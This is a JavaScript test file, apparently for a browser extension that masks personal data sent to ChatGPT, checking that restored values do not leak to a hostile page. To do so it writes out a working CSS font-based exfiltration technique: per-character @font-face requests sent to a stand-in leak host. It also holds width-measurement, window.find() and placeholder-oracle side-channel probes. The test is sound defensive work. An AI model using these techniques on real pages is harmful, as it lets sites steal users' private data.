// (10) Restored values are not observable by the page (H3).
//
// The AI site is the party a value was masked from, so a page that turns hostile
// must not learn a restored original. The page here attacks the restore the way
// a real one could:
//   - fonts: `@font-face` rules with one remote `src` per `unicode-range` character,
//     under a page-chosen family AND under the names of common system fonts (Arial,
//     DejaVu Sans, "system-ui", "sans-serif", ...), forced onto the restored elements
//     with `!important`; every font request goes to https://fonts.leak.test/<family>/
//     and is recorded (then refused) by the harness;
//   - layout: it measures the restored elements' boxes for values of different length;
//   - text search: `window.find()` for the value (it searches shadow-tree text);
//   - oracle: it writes a sent placeholder into a response container it created before
//     the send, and a placeholder the vault issued but the user never sent (a masked
//     paste that was deleted) into a brand-new response container.
// Controls prove each probe is live: page-owned text in a page font triggers the
// per-character fetches, page-owned spans with the same values have different widths,
// and `window.find()` finds page text.

import { EMAIL_2 } from "../lib/data.mjs";
import { waitFor } from "../lib/expect.mjs";
import {
	lastResponseText,
	pasteText,
	readEditor,
	typePrompt,
	waitForPrompt,
	waitForResponseComplete,
} from "../lib/harness.mjs";
import { SITES } from "../lib/sites.mjs";

const SITE = "chatgpt";
const LEAK_HOST = "https://fonts.leak.test";
/** Page-chosen family plus names a hostile page can shadow with @font-face. */
const SHADOWED_FAMILIES = [
	"aidr-leak",
	"system-ui",
	"sans-serif",
	"monospace",
	"Arial",
	"Helvetica",
	"Roboto",
	"Segoe UI",
	"DejaVu Sans",
	"Liberation Sans",
	"Noto Sans",
];
const CONTROL_FAMILY = "aidr-control";

function fontFaces(family, chars) {
	const slug = encodeURIComponent(family.replace(/\s+/g, "-").toLowerCase());
	return [...chars]
		.map((ch) => {
			const cp = ch.codePointAt(0).toString(16);
			return `@font-face{font-family:"${family}";src:url(${LEAK_HOST}/${slug}/${cp});unicode-range:U+${cp};}`;
		})
		.join("\n");
}

function hostileCss(chars) {
	const families = SHADOWED_FAMILIES.map((f) => `"${f}"`).join(",");
	return [
		...SHADOWED_FAMILIES.map((f) => fontFaces(f, chars)),
		fontFaces(CONTROL_FAMILY, chars),
		// Forced onto the restored elements (inherited into their shadow trees, and matched
		// directly): page text elsewhere keeps the page font, so a leak-family request can
		// only come from a restored value.
		`.aidr-restored,.aidr-restored *{font-family:${families} !important;letter-spacing:9px !important;}`,
		`#leak-control{font-family:"${CONTROL_FAMILY}" !important;}`,
	].join("\n");
}

export default [
	{
		id: "restore-side-channels",
		title: "restored values leak nothing to page CSS/JS (fonts, width, find, oracle)",
		settings: { mode: "auto", restoreResponses: true },
		skip: (h, data) => {
			if (!h.coversSite(SITE)) return `content scripts are not declared for ${SITES[SITE].origin}`;
			const types = new Set((data?.items ?? []).map((i) => i.type));
			return ["EMAIL", "TC_KIMLIK", "IBAN"].every((t) => types.has(t))
				? null
				: "needs EMAIL, TC_KIMLIK and IBAN values (full data profile)";
		},
		async run({ h, checks, data, open }) {
			const email = data.items.find((i) => i.type === "EMAIL")?.value;
			const tckn = data.items.find((i) => i.type === "TC_KIMLIK")?.value;
			const iban = data.items.find((i) => i.type === "IBAN")?.value;
			const values = [tckn, email, iban];
			const chars = new Set(values.join(""));
			const page = await open(SITE);

			// Hostile page: fonts, and an assistant container created BEFORE the send.
			await page.addStyleTag({ content: hostileCss(chars) });
			await page.evaluate(() => {
				const stale = document.createElement("div");
				stale.id = "stale-answer";
				stale.setAttribute("data-message-author-role", "assistant");
				document.getElementById("thread").append(stale);
			});

			// A masked paste the user then deletes: its placeholder is in the vault but never sent.
			await pasteText(page, SITE, `old contact ${EMAIL_2} x`);
			await waitFor(async () => /\[EMAIL_\d+\]/.test(await readEditor(page, SITE)), {
				timeout: 5000,
				message: "the pasted text to be masked into the editor",
			});
			const unsent = (await readEditor(page, SITE)).match(/\[EMAIL_\d+\]/)?.[0];
			await page.locator(SITES[SITE].editor).click();
			await page.keyboard.press("Control+A");
			await page.keyboard.press("Backspace");
			await waitFor(async () => (await readEditor(page, SITE)).trim() === "", {
				timeout: 3000,
				message: "the editor to be cleared",
			});

			const mark = h.recorder.mark();
			await typePrompt(page, SITE, `Contact ${email}, TCKN ${tckn}, IBAN ${iban}`);
			await page.keyboard.press("Enter");
			const sent = await waitForPrompt(h, SITE, mark);
			const body = sent.json?.prompt ?? sent.raw ?? "";
			for (const v of values) checks.excludes("the prompt left masked", body, v);
			await waitForResponseComplete(page);
			const shown = await waitFor(
				async () => {
					const text = await lastResponseText(page, SITE);
					return values.every((v) => text?.includes(v)) ? text : null;
				},
				{ timeout: 5000, message: "the reply to show every restored value" },
			).catch(() => lastResponseText(page, SITE));
			for (const v of values)
				checks.contains("the user sees the restored value (accessibility tree)", shown, v);

			// Control for the font probe: page-owned text in a page font fetches per character.
			await page.evaluate((text) => {
				const control = document.createElement("div");
				control.id = "leak-control";
				control.textContent = text;
				document.body.append(control);
			}, values.join(" "));
			await page.waitForTimeout(1500);
			const fontRequests = h.recorder.requests
				.filter((r) => r.seq > mark && r.url.startsWith(LEAK_HOST))
				.map((r) => new URL(r.url).pathname);
			const control = fontRequests.filter((p) => p.startsWith(`/${CONTROL_FAMILY}/`));
			const leaked = fontRequests.filter((p) => !p.startsWith(`/${CONTROL_FAMILY}/`));
			checks.check(
				"control: page text in a hostile font fetches one font per character",
				new Set(control).size >= Math.min(chars.size, 10),
				{ control: [...new Set(control)].length, chars: chars.size },
			);
			checks.check(
				"no per-character font request was triggered by the restored values",
				leaked.length === 0,
				leaked.slice(0, 20),
			);

			const probe = await page.evaluate(
				({ values, sel }) => {
					const replies = document.querySelectorAll(sel);
					const reply = replies[replies.length - 1];
					const hosts = [...reply.querySelectorAll(".aidr-restored")];
					const box = (el) => {
						const r = el.getBoundingClientRect();
						return { w: r.width, h: r.height, sw: el.scrollWidth };
					};
					// Control: the same values as page-owned text have different widths.
					const controls = values.map((v) => {
						const span = document.createElement("span");
						span.textContent = v;
						reply.append(span);
						const b = box(span);
						span.remove();
						return b.w;
					});
					document.getElementById("leak-control")?.remove();
					const found = values.map((v) => window.find(v, true, false, true));
					const foundPart = window.find(values[1].slice(0, 6), true, false, true);
					const controlFind = window.find("follow up", true, false, true);
					getSelection()?.removeAllRanges();
					document.execCommand("selectAll");
					const selected = getSelection()?.toString() ?? "";
					getSelection()?.removeAllRanges();
					return {
						hosts: hosts.map((el) => ({ placeholder: el.dataset.aidrPlaceholder, ...box(el) })),
						controls,
						found,
						foundPart,
						controlFind,
						selectionLeaks: values.filter((v) => selected.includes(v)),
						pageText: document.body.innerText,
					};
				},
				{ values, sel: SITES[SITE].response },
			);
			checks.check("three restored values in the reply", probe.hosts.length === 3, probe.hosts);
			const widths = probe.hosts.map((b) => b.w);
			checks.check(
				"control: the same values as page text have different widths",
				Math.max(...probe.controls) - Math.min(...probe.controls) > 5,
				probe.controls,
			);
			checks.check(
				"every restored value has the same box (width does not reveal length)",
				widths.length > 1 && Math.max(...widths) - Math.min(...widths) < 0.5,
				probe.hosts,
			);
			checks.check(
				"scrollWidth is constant too",
				new Set(probe.hosts.map((b) => b.sw)).size === 1,
				probe.hosts,
			);
			checks.equal("control: window.find() finds page text", probe.controlFind, true);
			checks.check(
				"window.find() cannot find a restored value",
				probe.found.every((f) => f === false) && probe.foundPart === false,
				{ found: probe.found, foundPart: probe.foundPart },
			);
			checks.check("select-all does not copy a restored value", probe.selectionLeaks.length === 0, probe.selectionLeaks);
			for (const v of values) checks.excludes("page innerText never has the value", probe.pageText, v);

			// Oracle attempts after the send.
			const placeholders = [...new Set(body.match(/\[[A-Z_]+_\d+(?:_[a-z0-9]{4,8})?\]/g) ?? [])];
			await page.evaluate(
				({ sentPh, unsentPh }) => {
					document.getElementById("stale-answer").textContent = `stale ${sentPh}`;
					const fresh = document.createElement("div");
					fresh.id = "fresh-answer";
					fresh.setAttribute("data-message-author-role", "assistant");
					fresh.textContent = `unsent ${unsentPh}`;
					document.getElementById("thread").append(fresh);
				},
				{ sentPh: placeholders[0], unsentPh: unsent },
			);
			await page.waitForTimeout(500);
			const oracle = await page.evaluate(() => ({
				stale: document.querySelectorAll("#stale-answer .aidr-restored").length,
				fresh: document.querySelectorAll("#fresh-answer .aidr-restored").length,
			}));
			checks.check("the paste placeholder was issued by the vault", !!unsent, { unsent });
			checks.equal(
				"a sent placeholder written into a container older than the send is not restored",
				oracle.stale,
				0,
			);
			checks.equal(
				"a vault placeholder that was never sent is not restored, even in a new container",
				oracle.fresh,
				0,
			);
		},
	},
];
